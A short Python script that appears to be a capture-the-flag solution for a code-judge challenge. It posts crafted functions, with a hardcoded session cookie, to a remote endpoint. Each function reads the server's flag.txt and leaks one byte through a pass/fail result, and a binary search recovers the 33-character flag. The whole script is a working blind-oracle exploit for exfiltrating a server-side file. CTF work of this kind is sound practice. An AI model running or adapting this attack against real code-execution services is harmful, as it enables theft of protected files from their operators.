import requests
import time
myFormatCodeG = """def f(a, b):
    if a==2 and b==3:
        f = open("flag.txt", "rb")
        b = f.read()[{}]
        if b > {}:
            return 5
        else:
            return 4
    else:
        return a"""

myFormatCodeL = """def f(a, b):
    if a==2 and b==3:
        f = open("flag.txt", "rb")
        b = f.read()[{}]
        if b < {}:
            return 5
        else:
            return 4
    else:
        return a"""

flagLen = 33
urls = "https://yeetcode.be.ax/yeetyeet"
cookie = {"session": "eyJydW4iOmZhbHNlfQ.YSBRoA.tysIiP53vCiR6K95eHZA_1hxk30"}


def encrypt(index):
    a, b = 32, 127
    mid = (a + b) >> 1
    while a < b:
        print("try {}".format(mid))
        r = requests.post(url=urls, data = myFormatCodeL.format(index, mid), cookies = cookie)
        if r.json()["p"] == 1: # if b < mid
            b = mid
        else:
            a = mid + 1
        mid = (a+b) >> 1
        time.sleep(0.1)
    return chr(mid-1)
        
flag = ""

if __name__ == '__main__':
    for i in range(33):
        flag += encrypt(i)
        print(flag)
        
